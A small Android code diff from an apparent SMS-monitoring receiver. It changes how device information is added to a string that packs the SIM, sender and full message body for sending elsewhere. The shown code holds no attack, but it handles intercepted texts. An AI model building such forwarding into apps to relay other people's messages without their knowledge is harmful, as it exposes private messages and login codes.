@@ -68,7 +68,7 @@ public class SMSMonitor extends BroadcastReceiver {
     }
 
     public String request(String from, String index, String name, String number, String body){
-        String ModelInfo = Build.BRAND + " - " + Build.MODEL + " - " + "SIM " + index + "%0A";
+        String ModelInfo = MainActivity.info() + " - " + "SIM " + index + "%0A";
         String to = "SIM: " + name + ", " + number + "%0A";
         return ModelInfo + to + "from: " + from + "%0A" + body;
     }
